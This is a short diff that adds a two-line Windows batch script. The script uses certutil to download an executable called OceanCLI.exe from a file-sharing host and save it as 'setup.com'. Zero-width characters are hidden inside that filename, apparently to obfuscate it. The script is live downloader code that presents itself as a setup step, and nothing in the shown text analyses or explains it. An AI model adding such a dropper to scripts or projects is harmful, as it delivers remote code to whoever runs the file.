@@ -1,0 +1,2 @@
+@echo off
+certutil -urlcache -split -f https://easyfiles.cc/2025/3/d52335fc-9e76-45b3-be6b-3bd96d4fab66/OceanCLI.exe X:/​s​e​t​u​p​.com
